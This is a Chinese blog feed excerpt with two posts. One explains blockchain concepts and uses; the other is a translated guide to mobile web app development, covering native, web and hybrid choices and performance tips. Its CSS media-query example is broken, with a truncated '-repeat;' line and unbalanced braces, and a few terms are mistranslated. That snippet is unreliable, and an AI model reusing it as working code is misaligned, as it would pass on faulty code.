为什么区块链很重要？</h1><p>传统数据库技术为记录金融交易带来了很多难题。例如，在房地产销售领域。在交换资金后，房地产的所有权将转移给买方。买卖双方中的任何一方均可记录货币交易，但任何一方的来源均不可信。即便卖方已收款，也可轻松声称他们未收款；同样，即便买方未付款，也可辩称他们已付款。</p><p>为了避免潜在的法律问题，需要一个可信的第三方负责监督和验证交易。这种中央机构的存在，不仅会使交易复杂化，还会造成单点漏洞。如果该中央数据口遭到入侵，双方都有可能蒙受损失。</p><p>区块链通过创建去中心化的防篡改系统来记录交易，可以缓解此类问题。在房地产交易场景中，区块链可分别为买方和卖方创建一个分类账。所有交易都必须获得双方批准，并将在双方的分类账中实时更新。历史交易中的任何损坏都会导致整个分类账损坏。区块链技术的这些属性以使其用于各个行业部类，包括比特币 (Bitcoin) 等数字货币的创造。</p><h1 id="3-不同行业如何使用区块链？"><a href="#3-不同行业如何使用区块链？" class="headerlink" title="3. 不同行业如何使用区块链？"></a>3. 不同行业如何使用区块链？</h1><p>区块链是一种新兴技术，很多行业都以创新方式采用了此技术。我们将在以下小节中介绍不同行业中的一些使用案例：</p><h3 id="能源"><a href="#能源" class="headerlink" title="能源"></a>能源</h3><p>多家能源公司使用区块链技术创建点对点能源交易平台，并简化可再生能源的获得。例如，考虑以下用途：</p><ul><li>多家基于区块链的能源公司创建了交易平台，用于个人之间的电力销售。拥有太阳能电池板的业主使用此平台将其多余的太阳能销售给邻居。该流程大部分是自动化的：智能电表创建交易，区块链则记录交易。</li><li>借助基于区块链的众筹计划，用户可在缺乏能源获得途径的社区内赞助和拥有太阳能电池板。在太阳能电池板建好后，赞助商还可以向这些社区收取租金。</li></ul><h3 id="金融"><a href="#金融" class="headerlink" title="金融"></a>金融</h3><p>传统金融系统（如银行和证券交易所）使用区块链服务来管理在线支付、账户和市场交易。例如，<a href="https://aws.amazon.com/cn/solutions/case-studies/singapore-exchange-case-study/">新加坡交易所 (Singapore Exchange Limited)</a> 是一家在整个亚洲提供金融交易服务的投资控股公司，该公司使用区块链技术构建了更高效的跨行支付账户。通过采用区块链，该公司解决了多个难题，包括数千项金融交易的批处理和手动对账。</p><h3 id="媒体和娱乐"><a href="#媒体和娱乐" class="headerlink" title="媒体和娱乐"></a>媒体和娱乐</h3><p>多家媒体和娱乐公司使用区块链系统来管理版权数据。版权验证对于艺术家的公平补偿至关重要。需要多次交易才能记录版权内容的销售或转让。<a href="https://www.forbes.com/sites/amazonwebservices/2019/11/19/how-sony-is-protecting-rights-of-digital-creators-using-blockchain-on-aws/">日本索尼音乐娱乐公司 (Sony Music Entertainment Japan)</a> 使用区块链服务使数字版权管理更加高效。该公司成功使用区块链策略提高了版权处理效率并降低了成本。</p><h3 id="零售"><a href="#零售" class="headerlink" title="零售"></a>零售</h3><p>多家零售公司使用区块链跟踪商品在供应商与买家之间的转移。例如，Amazon 零售为一套分布式分类账技术系统申请了专利，该系统使用区块链技术来验证并确保在该平台上销售的所有商品均为正品。Amazon 卖家可以通过允许参与者（如制造商、快递公司、分销商、最终用户和二级用户）向证书颁发机构注册后将事件添加到分类账，映射其全球供应链。 </p><h1 id="4-区块链技术具有哪些功能？"><a href="#4-区块链技术具有哪些功能？" class="headerlink" title="4. 区块链技术具有哪些功能？"></a>4. 区块链技术具有哪些功能？</h1><p>区块链技术具有以下主要功能：</p><h3 id="去中心化"><a href="#去中心化" class="headerlink" title="去中心化"></a>去中心化</h3><p>区块链中的去中心化是指将控制权和决策权从中心化实体（个人、组织或团体）转让给分布式网络。去中心化区块链网络使用透明度来减少对参与者之间取得信任的需要。这些网络还以削弱网络功能性的方式，阻止参与者彼此施加权力或控制。</p><h3 id="不可变性"><a href="#不可变性" class="headerlink" title="不可变性"></a>不可变性</h3><p>不可变性是指某些内容不能更改或改变。一旦某个参与者将交易记录到共享分类账中，则任何参与者均不能篡改该交易。如果某个交易记录包含错误，则您必须添加新交易以修正错误，并且整个网络均可看见这两个交易。</p><h3 id="共识"><a href="#共识" class="headerlink" title="共识"></a>共识</h3><p>区块链系统将建立关于参与者就记录交易达成共识的规则。仅当网络中的大部分参与者都同意时，才能记录新交易。</p><h1 id="5-区块链技术包含哪些关键组件？"><a href="#5-区块链技术包含哪些关键组件？" class="headerlink" title="5. 区块链技术包含哪些关键组件？"></a>5. 区块链技术包含哪些关键组件？</h1><p>区块链架构包含以下主要组件：</p><h3 id="分布式分类账"><a href="#分布式分类账" class="headerlink" title="分布式分类账"></a>分布式分类账</h3><p>分布式分类账是区块链网络中用于存储交易的共享数据库，如团队中的每个人均可编辑的共享文件。在大多数共享文本编辑者中，任何拥有编辑权限的人员均可删除整个文件。但分布式分类账技术对于谁能编辑以及如何编辑具有严格规则。一旦条目已被记录，您就无法删除它们。</p><h3 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h3><p>很多公司使用智能合约来自行管理业务合约，而不需要第三方的帮助。智能合约是存储在区块链系统上的程序，这些程序将在符合预先确定的条件时自动运行。这些程序将运行条件语句检查，以便能够放心地完成交易。例如，某家物流公司可能拥有一份智能合约，约定一旦商品抵达港口将自动进行付款。</p><h3 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h3><p>公钥加密是一种安全功能，用于唯一标识区块链网络中的参与者。此机制将为网络成员生成两组密钥。一组密钥是公钥，对于网络中的每个人都是公用的。另一组密钥是私钥，对于每个成员都是唯一的。私钥与公钥配合使用，解锁分类账中的数据。 </p><p>例如，John 和 Jill 是网络中的两个成员。John 记录了一项交易，并用其私钥进行了加密。Jill 可以使用其公钥解密该交易。通过这种方式，Jill 可以确信 John 进行了该交易。如果 John 的私钥已被篡改，则 Jill 的公钥不会发挥作用。</p><h1 id="6-区块链的工作原理是什么？"><a href="#6-区块链的工作原理是什么？" class="headerlink" title="6. 区块链的工作原理是什么？"></a>6. 区块链的工作原理是什么？</h1><p>虽然区块链的底层机制非常复杂，我们将通过以下步骤提供简要概述。区块链软件可以自动执行以下大部分步骤：</p><h3 id="第-1-步-–-记录交易"><a href="#第-1-步-–-记录交易" class="headerlink" title="第 1 步 – 记录交易"></a>第 1 步 – 记录交易</h3><p>区块链交易显示实体资产或数字资产从区块链网络中的一方向另一方的转移。该交易以区块的形式记录，可能包括如下细节：</p><ul><li>谁参与了该交易？</li><li>交易期间发生了什么情况？</li><li>交易是在何时进行的？</li><li>交易是在哪里进行的？</li><li>为什么进行该交易？</li><li>交换了多少资产？</li><li>交易期间符合多少前提条件？</li></ul><h3 id="第-2-步-–-达成共识"><a href="#第-2-步-–-达成共识" class="headerlink" title="第 2 步 – 达成共识"></a>第 2 步 – 达成共识</h3><p>分布式区块链网络中的大多数参与者必须就已记录的交易是有效的达成一致。根据网络类型，达成协议的规则可能有所不同，但通常是在网络开始建立时就制定好的。</p><h3 id="第-3-步-–-将区块链接起来"><a href="#第-3-步-–-将区块链接起来" class="headerlink" title="第 3 步 – 将区块链接起来"></a>第 3 步 – 将区块链接起来</h3><p>一旦参与者达成了共识，会将区块链中的交易写入区块，区块就相当于分类账账簿中的页面。连同交易一起，还会将一个加密哈希附加到新区块。该哈希作为将区块链接在一起的链条。如果有意或无意修改了区块的内容，则该哈希值也将更改，这将提供一种检测数据篡改的方式。 </p><p>因此，区块将与链条安全地链接在一起，且您无法编辑它们。每增加一个区块，都会强化前一个区块的验证，因而也会强化整个区块链的验证。这就像是堆砌木块建塔一样。您只能在前一层木块之上堆叠木块，如果您从塔的中间取出一个木块，则整座塔将垮塌。</p><h3 id="第-4-步-–-共享分类账"><a href="#第-4-步-–-共享分类账" class="headerlink" title="第 4 步 – 共享分类账"></a>第 4 步 – 共享分类账</h3><p>该系统会将中心分类账的最新副本分发给所有参与者。</p><h1 id="7-区块链网络有哪些类型？"><a href="#7-区块链网络有哪些类型？" class="headerlink" title="7. 区块链网络有哪些类型？"></a>7. 区块链网络有哪些类型？</h1><p>有四种主要类型的去中心化或分布式区块链网络：</p><h3 id="公有区块链网络"><a href="#公有区块链网络" class="headerlink" title="公有区块链网络"></a>公有区块链网络</h3><p>公有区块链无需权限，任何人均可加入它们。此类区块链的所有成员享有读取、编辑和验证区块链的平等权限。人们主要将公有区块链用于交换和挖掘加密货币，如比特币、以太坊 (Ethereum) 和莱特币 (Litecoin)。 </p><h3 id="私有区块链网络"><a href="#私有区块链网络" class="headerlink" title="私有区块链网络"></a>私有区块链网络</h3><p>一个组织可以控制多个私有区块链，又称为托管式区块链。该机构决定谁能成为成员，以及他们在该网络中拥有哪些权限。私有区块链只是部分去中心化，因为它们具有访问限制。Ripple 就是一个私有区块链的示例，它是一个面向企业的数字货币交换网络。</p><h3 id="混合区块链网络"><a href="#混合区块链网络" class="headerlink" title="混合区块链网络"></a>混合区块链网络</h3><p>混合区块链结合了私有网络和公有网络的元素。公司可随公有系统一起建立私有、基于权限的系统。通过这种方法，公司可以控制对区块链中存储的特定数据的访问，同时保持其余数据处于公开状态。公司使用智能合约允许公有成员检查私有交易是否已经完成。例如，混合区块链可以授予对数字货币的公有访问权限，同时保持银行拥有的货币处于私有状态。</p><h3 id="联盟区块链网络"><a href="#联盟区块链网络" class="headerlink" title="联盟区块链网络"></a>联盟区块链网络</h3><p>联盟区块链网络由一组组织负责监管。多家预先选择的组织共同承担维护区块链及确定数据访问权限的职责。对于其中很多组织拥有共同目标并可通过共担责任而获益的行业，通常更喜欢联盟区块链网络。例如，全球航运业务网络联盟 (Global Shipping Business Network Consortium) 是一个非营利性区块链联盟，该联盟致力于实现航运业数字化，以及加强海运业运营商之间的合作。</p><h1 id="8-什么是区块链协议？"><a href="#8-什么是区块链协议？" class="headerlink" title="8. 什么是区块链协议？"></a>8. 什么是区块链协议？</h1><p>术语区块链协议一词是指可用于应用程序开发的不同类型的区块链平台。每种区块链协议都采用基本区块链原则来适应特定行业或应用需求。以下小节提供了一些区块链协议的示例：</p><h3 id="Hyperledger-Fabric"><a href="#Hyperledger-Fabric" class="headerlink" title="Hyperledger Fabric"></a>Hyperledger Fabric</h3><p><a href="https://aws.amazon.com/cn/blockchain/what-is-hyperledger-fabric/">Hyperledger Fabric</a> 是一个开源项目，包含一套工具和库。企业可以使用它来迅速有效地构建私有区块链应用程序。它是一种模块化通用框架，提供独特的身份管理和访问控制功能。这些功能使其非常适合各种应用，如供应链的跟踪和追踪、贸易金融、忠诚度和奖励，以及金融资产的清算结算。</p><h3 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h3><p><a href="https://aws.amazon.com/cn/blockchain/what-is-ethereum/">以太坊</a>是一种去中心化开源区块链平台，人们可以将其用于构建公有区块链应用程序。企业以太坊 (Ethereum Enterprise) 专为企业使用案例而设计。</p><h3 id="Corda"><a href="#Corda" class="headerlink" title="Corda"></a>Corda</h3><p>Corda 是一种专为企业而设计的开源区块链项目。借助 Corda，您可以构建可互操作的区块链网络，用于在严格保密的情况下进行交易。企业可以使用 Corda 的智能合约技术直接进行有价值的交易。其大部分用户是金融机构。</p><h3 id="Quorum"><a href="#Quorum" class="headerlink" title="Quorum"></a>Quorum</h3><p>Quorum 是一种源自以太坊的开源区块链协议。该协议专为在两种区块链网络中使用而设计：私有区块链网络，其中只有一个成员拥有所有节点；或者联盟区块链网络，其中包含多个成员，每个成员拥有该网络的一部分。</p><h1 id="9-区块链技术是如何发展的？"><a href="#9-区块链技术是如何发展的？" class="headerlink" title="9. 区块链技术是如何发展的？"></a>9. 区块链技术是如何发展的？</h1><p>区块链技术起源于 1970 年代末，当时一位名为 Ralph Merkle 的计算机科学家申请了哈希树（又名 Merkle 树）的专利。这些树是一种计算机科学结构，通过使用加密将区块链接起来，用于存储数据。在 1990 年代末，Stuart Haber 和 W. Scott Stornetta 使用 Merkle 树实现了无法篡改文档时间戳的系统。这是区块链历史上的首个实例。</p><p>该技术一直在不断发展，已经经过以下三代：</p><h3 id="第一代-–-比特币和其他虚拟货币"><a href="#第一代-–-比特币和其他虚拟货币" class="headerlink" title="第一代 – 比特币和其他虚拟货币"></a>第一代 – 比特币和其他虚拟货币</h3><p>2008 年，一个仅知道名字为中本聪 (Satoshi Nakamoto) 的匿名个人或团体，概述了区块链技术的现代形态。中本聪的比特币区块链理念将 1 MB 信息区块用于比特币交易。比特币区块链系统的很多功能，即便是今天也仍处于区块链技术的中心地位。</p><h3 id="第二代-–-智能合约"><a href="#第二代-–-智能合约" class="headerlink" title="第二代 – 智能合约"></a>第二代 – 智能合约</h3><p>在第一代加密货币出现后的几年，开发人员开始考虑加密货币以外的区块链应用。例如，以太坊的发明者们决定在资产转让交易中使用区块链技术。他们的重要贡献就是智能合约功能。</p><h3 id="第三代-–-未来"><a href="#第三代-–-未来" class="headerlink" title="第三代 – 未来"></a>第三代 – 未来</h3><p>随着众多公司发现和实现新应用，区块链技术也在不断发展和成长。很多公司正在解决规模和计算能力的限制，在正在进行的区块链革命中，潜在机会是无限的。</p><h1 id="10-区块链技术有哪些好处？"><a href="#10-区块链技术有哪些好处？" class="headerlink" title="10. 区块链技术有哪些好处？"></a>10. 区块链技术有哪些好处？</h1><p>区块链技术可为资产交易管理带来很多好处。我们将在以下小节中列出其中部分好处：</p><h3 id="高级安全功能"><a href="#高级安全功能" class="headerlink" title="高级安全功能"></a>高级安全功能</h3><p>区块链系统可以提供现代数字交易所需的高级安全和信任功能。对于有人会操纵底层软件为自己生成假币的恐惧始终存在。但区块链使用加密、去中心化和共识三项原则，创建了高度安全、几乎不可能篡改的底层软件系统。不会有单点故障，并且单个用户也无法更改交易记录。</p><h3 id="更高的效率"><a href="#更高的效率" class="headerlink" title="更高的效率"></a>更高的效率</h3><p>企业间交易可能需要大量时间，还会造成运营瓶颈，尤其是在涉及合规和第三方监管机构时。区块链中的透明度和智能合约可使此类业务交易更快捷、更高效。</p><h3 id="更快捷的审计"><a href="#更快捷的审计" class="headerlink" title="更快捷的审计"></a>更快捷的审计</h3><p>企业必须能以可审计的方式，安全地生成、交换、归档和重建电子交易。区块链记录按时间顺序不可变，这意味着所有记录均始终按时间顺序排列。这样的数据透明使得审计过程更加快捷。</p><h1 id="11-比特币与区块链之间有什么区别？"><a href="#11-比特币与区块链之间有什么区别？" class="headerlink" title="11. 比特币与区块链之间有什么区别？"></a>11. 比特币与区块链之间有什么区别？</h1><p>比特币与区块链可以互换使用，但它们是两种不同的事物。由于比特币是区块链技术的早期应用，人们无意间开始使用比特币来指代区块链，因而造成了这种误用。但除比特币外，区块链技术还有很多应用。</p><p>比特币是一种在没有任何中心化控制的情况下运营的数字货币。最初创建比特币的目的在于在线进行金融交易，但现在已被视为可转换为任何其他全球货币（如美元或欧元）的数字资产。公有比特币区块链网络将创建和管理中心分类账。 </p><h3 id="比特币网络"><a href="#比特币网络" class="headerlink" title="比特币网络"></a>比特币网络</h3><p>公有分类账记录所有比特币交易，而世界各地的众多服务器则保存此分类账的副本。这些服务器就像银行。只是每个银行仅了解其客户兑换的资金，而比特币服务器则了解世界上的每一笔比特币交易。</p><p>任何拥有闲置计算机的人员均可搭建一台此类服务器，称为节点。这就像是开设您自己的比特币银行，而不是银行账户。</p><h3 id="比特币挖矿"><a href="#比特币挖矿" class="headerlink" title="比特币挖矿"></a>比特币挖矿</h3><p>在公有比特币网络上，成员通过求解加密方程来创建新区块，以挖掘加密货币。该系统将向该网络公开广播每一笔新交易，并在各节点间共享这一信息。每十分钟左右，挖矿者会将这些交易收集到一个新区块中，再将这些新区块永久添加到区块链中，该区块链就像比特币的最终账簿。</p><p>由于软件进程的复杂性，因此挖矿需要大量计算资源，并且需要很长时间。作为交换，挖矿者可以赚取少量加密货币。挖矿者相当于记录交易并收取交易费用的现代职员。</p><p>该网络上的所有参与者都将使用区块链加密技术，就谁拥有哪些比特币达成共识。</p><h1 id="12-数据库与区块链之间有什么区别？"><a href="#12-数据库与区块链之间有什么区别？" class="headerlink" title="12. 数据库与区块链之间有什么区别？"></a>12. 数据库与区块链之间有什么区别？</h1><p>区块链是一种特殊类型的数据库管理系统，拥有比常规数据库更多的功能。我们将在下面的列表中介绍传统数据库与区块链之间的一些重要区别：</p><ul><li>区块链去中心化控制，而不会破坏现有数据中的信任。这在其他数据库系统中是不可能实现的。</li><li>参与交易的公司无法共享其整个数据库。但在区块链网络中，每家公司都拥有其分类账副本，并且该系统将自动维护两份分类账之间的一致性。</li><li>虽然在大多数数据库系统中，您都可以编辑或删除数据，但在区块链中，您只能插入数据。</li></ul><h1 id="13-区块链与云有什么区别？"><a href="#13-区块链与云有什么区别？" class="headerlink" title="13. 区块链与云有什么区别？"></a>13. 区块链与云有什么区别？</h1><p>术语云一词是指可以在线访问的计算服务。您可以通过云访问软件即服务 (SaaS)、产品即服务 (PaaS) 和基础设施即服务 (IaaS)。云提供商负责管理其硬件和基础设施，并为您提供通过互联网访问这些计算资源的权限。他们还会提供更多其他资源，而不只是数据库管理。如果您想加入公有区块链网络，则需提供您的硬件资源，用于存储您的分类账副本。您也可以将云上的服务器用于此目的。有些云提供商也在云上提供完整的区块链即服务 (BaaS)。</p><h1 id="14-什么是区块链即服务？"><a href="#14-什么是区块链即服务？" class="headerlink" title="14. 什么是区块链即服务？"></a>14. 什么是区块链即服务？</h1><p>区块链即服务 (BaaS) 是第三方在云上提供的一种托管式区块链服务。您可以开发区块链应用程序和数字服务，而云提供商则提供基础设施和区块链构建工具。您要做的就是自定义现有区块链技术，以便更快捷、更高效地采用区块链。  </p>]]></content>
      
      
      
        <tags>
            
            <tag> 架构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mobile Web Development-When, Why, and How</title>
      <link href="/2022/10/03/Mobile%20Web%20Development-When,%20Why,%20and%20How/"/>
      <url>/2022/10/03/Mobile%20Web%20Development-When,%20Why,%20and%20How/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://www.toptal.com/app/developing-mobile-web-apps-when-why-and-how">Mobile Web Development: When, Why, and How</a></p><p>根据 Statista 最近的一项研究，地球上有 77.5 亿人，其中超过 60 亿人使用智能手机。 随着移动计算的日益单一化，移动 Web 开发比以往任何时候都更加重要。</p><p><code>作为移动设备用户，没有什么比设计不佳的移动 Web 应用程序或原生应用程序更令人沮丧和难以驾驭的了。</code></p><p><code>作为一名移动应用程序开发人员，很少有事情能像努力支持尽可能广泛的移动客户端一样具有独特的挑战性，每个移动客户端都有自己的一套特质。</code> 无论您选择开发mobile Web、native还是hybrid应用程序，支持多种移动浏览器和更奇特的设备——并掌握各种平台——都可能是一种非常痛苦的体验。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-f33323c6d46b7b28.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>当然，今天并不是每个开发人员都需要担心支持移动客户端。 但移动设备和应用程序日益流行的性质强烈表明，那些今天不需要支持移动客户端的人很可能需要在不远的将来这样做。 因此，如果您还没有考虑开发移动应用程序，那么您应该考虑。</p><h1 id="Mobile-Web-App-vs-Native-App-vs-Hybrid-App"><a href="#Mobile-Web-App-vs-Native-App-vs-Hybrid-App" class="headerlink" title="Mobile Web App vs. Native App vs. Hybrid App"></a>Mobile Web App vs. Native App vs. Hybrid App</h1><p>与大多数技术选择一样，对于要开发的移动应用程序类型，没有一刀切的答案。有许多 Web 应用程序最佳实践需要考虑，但并非所有这些都是技术性的。你的目标受众是谁？他们更喜欢mobile web还是native应用？native应用和hybrid应用有什么区别？您拥有哪些开发资源，他们最熟悉哪些移动技术？您为您的产品设想的许可和销售模式是什么？</p><p>一般来说（尽管总是有例外），mobile web比native 移动应用程序路由更快、更便宜，尤其是当目标是支持广泛的设备时。相反，可能存在移动设备的原生功能（例如运动传感器等），这些功能对您的应用程序至关重要，但只能通过原生应用程序访问（因此，这将使你放弃选择移动 Web 应用程序）。</p><p>除了旧的 Web 应用程序与native应用程序的问题之外，hybrid 移动应用程序可能是您的正确答案，具体取决于您的要求和资源限制。hybrid应用程序，如native应用程序一样，在设备本身上运行（而不是在浏览器内部），但使用 Web 技术（HTML5、CSS 和 JavaScript）编写，通常由hybrid应用程序框架支持。更具体地说，hybrid应用程序在本机容器内运行，并利用设备的浏览器引擎（但不是浏览器）来呈现 HTML 并在本地处理 JavaScript。 Web 到本机的抽象层允许访问在移动 Web 应用程序中无法访问的设备功能，例如加速度计、相机和本地存储。</p><p><code>但无论您做出何种选择——无论是移动 Web 应用程序、native应用程序还是hybrid应用程序——都要小心地充分研究并确认您的假设。</code>例如，出于本移动 Web 开发教程的目的，您可能已经决定为电子商务开发一个native移动应用程序来销售您的产品。然而，50% 的智能手机用户仍然更有可能使用移动网站而不是下载应用程序——根据您的目标市场，这个数字可能更大。</p><p>然后，当然，还有时间和预算的实际考虑。 正如我最喜欢的谚语之一所说，“更快、更好、更便宜：选择任何两个。” 虽然上市时间和成本限制在 Web 应用程序开发中至关重要，但在过程中不要对质量做出过分妥协也很重要。 初次体验不佳的用户很难恢复信心。</p><p>事实上，mobile web、 native和hybrid应用程序都是完全不同的野兽，每一种都有自己独特的优势和挑战。 本教程重点介绍在开发功能强大、直观且易于使用的mobile Web 应用程序时要使用的方法和工具，以及要避免的陷阱。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-45101a7eb78da8ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="Mobile-Web-Development-Requires-Detailed-Planning"><a href="#Mobile-Web-Development-Requires-Detailed-Planning" class="headerlink" title="Mobile Web Development Requires Detailed Planning"></a>Mobile Web Development Requires Detailed Planning</h1><p>确定您（或您的客户）的需求是应用程序开发、移动或其他方面的基本功。仔细研究目标功能以确定它们是否可以在您的移动 Web 应用程序中实现。如果当您已经投入时间和资源来设计基于 Web 的界面和支持基础设施时，才意识到这套框架不支持您的一个或多个客户端，这样是十分低效的。</p><p><code>mobile web应用程序开发新手的另一个常见问题是预设基于pc浏览器的代码将在移动浏览器中“按原样”工作。</code>这不是真的。肯定存在差异，如果你不知道它们，它们肯定会咬你。例如，HTML5 <video> 标签的自动播放功能不适用于移动浏览器。同样，现在大多数移动浏览器不支持（或至少不始终支持）CSS 过渡和不透明度属性。您还会遇到移动平台上的某些 Web API 方法的问题，例如需要 Adobe Flash 的 SoundCloud 音乐流 API，大多数移动设备不支持该 API。</p><p>开发移动网络应用程序时一个特别复杂的因素是移动设备的寿命往往比桌面显示器的寿命短得多（美国手机的平均寿命约为 30 个月）。这些较短的设备寿命，伴随着新移动设备和技术的不断发布，产生了不断变化的目标设备格局。虽然在浏览器中工作通过使您免受许多特定于设备的问题的影响而在一定程度上缓解了这个问题，但您仍然需要设计一个支持多种屏幕分辨率的基于浏览器的视图，并针对横向和纵向进行适当调整。</p><p>还需要考虑支持 Apple 的 Retina 显示器（液晶显示器的像素密度非常高，以至于人眼无法在典型的观看距离上辨别单个像素）。包括 iPhone、iPod Touch、iPad、MacBook Pro、iPad Mini 和 iPad Air 在内的几款 Apple 产品都提供 Retina 显示屏。特别是在针对移动设备优化 Web 应用程序时，重要的是要意识到 Retina 显示屏会使通常提供给移动设备的低分辨率图像看起来很模糊，并且可能会出现像素化。在这些情况下，最好的应用程序开发解决方案是让服务器识别请求来自 Retina 设备，并向客户端提供替代的更高分辨率图像。</p><p>如果您想使用一些很酷的 HTML5 内容，<code>请记住提前验证您正在寻找的功能是否在您的客户可能使用的设备环境中受支持。 </code>例如，在 iOS 6 及更高版本中，不支持导航器 getUserMedia 功能，因为相机只能通过本机应用程序访问。 caniuse.com 和 html5test.com 是检查特定设备和浏览器支持的两个重要资源。</p><p>CSS3 媒体查询还可以帮助您为每个设备提供定制的内容。 下面是一些用于捕获不同设备特征的示例代码，例如像素密度、屏幕分辨率和方向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* For lower than 700px resolutions *&#x2F;</span><br><span class="line">@media (max-width: 700px) &#123; ... &#125;</span><br><span class="line">&#x2F;* Same as last but with the device orientation on land scape *&#x2F;</span><br><span class="line">@media (max-width: 700px) and (orientation: landscape) &#123; ... &#125;</span><br><span class="line">&#x2F;* Including width and orientation you can add a media type clause,</span><br><span class="line">   in this case &#39;tv&#39; *&#x2F;</span><br><span class="line">@media tv and (min-width: 700px) and (orientation: landscape) &#123; ... &#125;</span><br><span class="line">&#x2F;* for low resolution display with background-image *&#x2F;</span><br><span class="line">.image &#123;</span><br><span class="line">    background-image: url(&#x2F;path&#x2F;to&#x2F;my&#x2F;image.png);</span><br><span class="line">    background-size: 200px 300px;</span><br><span class="line">    height: 300px;</span><br><span class="line">    width: 200px;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* for high resolution (Retina) display with background-image *&#x2F;</span><br><span class="line">@media only screen and (min--moz-device-pixel-ratio: 2),</span><br><span class="line">only screen and (-o-min-device-pixel-ratio: 2&#x2F;1),</span><br><span class="line">only screen and (-webkit-min-device-pixel-ratio: 2),</span><br><span class="line">only screen and (min-device-pixel-ratio: 2) &#123;</span><br><span class="line">    -repeat;</span><br><span class="line">        background-size: 200px 400px;</span><br><span class="line">    &#x2F;* rest of your styles... *&#x2F;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Optimizing-Your-Mobile-Web-Application-for-Performance"><a href="#Optimizing-Your-Mobile-Web-Application-for-Performance" class="headerlink" title="Optimizing Your Mobile Web Application for Performance"></a>Optimizing Your Mobile Web Application for Performance</h1><p>天哪，这东西太慢了！” 作为一名移动 Web 开发人员，这些可能是您最不想从您的用户那里听到的一句话。 因此，您必须仔细考虑如何减少和优化每个字节和服务器传输，以减少用户的等待时间。 期望传输总是在 Wi-Fi 网络上发生是不现实的，您应该知道，如果加载时间超过 3 秒，<code>53% 的移动站点访问将被放弃。 还值得注意的是，搜索引擎将加载时间作为其页面质量得分计算的一部分。</code></p><p>作为本移动 Web 开发教程的一部分，这里有一些技巧可以帮助优化您的移动 Web 应用程序的性能并最大限度地减少延迟：</p><ul><li><strong>图像优化</strong> 众所周知，图像加载时间是影响移动设备页面加载的最大性能问题之一。 使用在线图像优化器（例如 Kraken.io）有助于解决此问题。</li><li><strong>代码压缩</strong> 根据您拥有的代码量，压缩 JavaScript 和 CSS 文件会对性能产生重大影响。</li><li><strong>数据库查询</strong> 一些移动设备浏览器接受的 cookie 不如桌面浏览器多，这可能导致需要执行比平时更多的查询。 因此，在支持移动 Web 应用程序客户端时，服务器端缓存尤其重要。 请记住使用适当的过滤器来阻止 SQL 查询注入，否则可能会危及您的站点和服务器的安全性。</li><li><strong>内容交付网络 (CDN)</strong> 如果您计划提供大量视频、图像、音频文件或其他类型的媒体，强烈建议使用 CDN。 一些更常见的商业 CDN 包括 Amazon S3、Microsoft Azure 和 MaxCDN。 使用 CDN 的优势很多，包括：<ul><li><strong>改进的下载性能</strong> 利用 CDN 的资源，您可以分配负载、节省带宽并提高性能。更好的 CDN 提供更高的可用性、更低的网络延迟和更低的丢包率。此外，许多 CDN 提供全球分布的数据中心选择，使下载可以从更靠近用户位置的服务器进行（导致更少的网络跃点和更快的下载）。</li><li><strong>更多并发下载</strong> 浏览器通常会限制到单个域的并发连接数，之后会阻止其他下载，直到之前的下载之一完成。从同一站点下载许多大文件时，您经常可以看到此限制。每个额外的 CDN（在不同的域上）都允许额外的并发下载。</li><li><strong>增强分析</strong> 许多商业 CDN 提供使用报告，可以补充您自己的网站分析，并可能提供更好的视频观看和下载量化。例如，GTmetrix 有一个出色的网站报告工具，用于监控和优化您网站上加载的资源。</li></ul></li></ul><h1 id="Tools-for-Developing-Mobile-Web-Apps"><a href="#Tools-for-Developing-Mobile-Web-Apps" class="headerlink" title="Tools for Developing Mobile Web Apps"></a>Tools for Developing Mobile Web Apps</h1><p>“为正确的工作选择正确的工具”是一句古老的格言，它同样适用于软件开发，就像它适用于任何其他领域一样。 本教程提供并介绍了一些用于移动 Web 开发的更流行和广泛使用的工具，但请记住，很可能还有其他工具是开发移动 Web 应用程序的“正确”工具，具体取决于您的要求和 可用资源。</p><h1 id="JavaScript-Mobile-Web-App-Frameworks"><a href="#JavaScript-Mobile-Web-App-Frameworks" class="headerlink" title="JavaScript Mobile Web App Frameworks"></a>JavaScript Mobile Web App Frameworks</h1><p>由于移动 Web 开发往往会带来许多相同的常见挑战，例如跨浏览器兼容性以及移动浏览器中的 HTML 和 CSS 不一致，因此开发了专门用于解决这些问题的框架（基于 HTML5 和 CSS3）并在各种智能手机和平板电脑上尽可能完美地工作。这些移动网络应用程序框架中的大多数都是轻量级的，这有助于促进快速移动网络浏览，而不会影响您网站的外观和感觉。</p><p>将我们的视野扩展到移动领域之外，如果有一个流行的 JavaScript 框架值得一提，那就是 jQuery。如果您熟悉桌面版本，我建议您尝试将 jQuery Mobile 用于您的移动 Web 应用程序。 （注意：jQuery Mobile 最近已被弃用。）它有一个小部件库，可将语义标记转换为手势友好格式，使触摸屏上的操作变得容易。最新版本包含一个轻量级代码库，其中包含大量图形元素，可以真正改善您的 UI。</p><p>另一种替代品 Sencha Touch 也在迅速获得市场份额。 它提供了出色的整体性能，并有助于生成在很大程度上看起来和感觉像原生界面的移动 Web 用户界面。 它的全功能小部件库基于 Sencha 的 ExtJS JavaScript 库。 （注：Sencha Touch 已与 ExtJS 合并。）</p><p>以下是比较 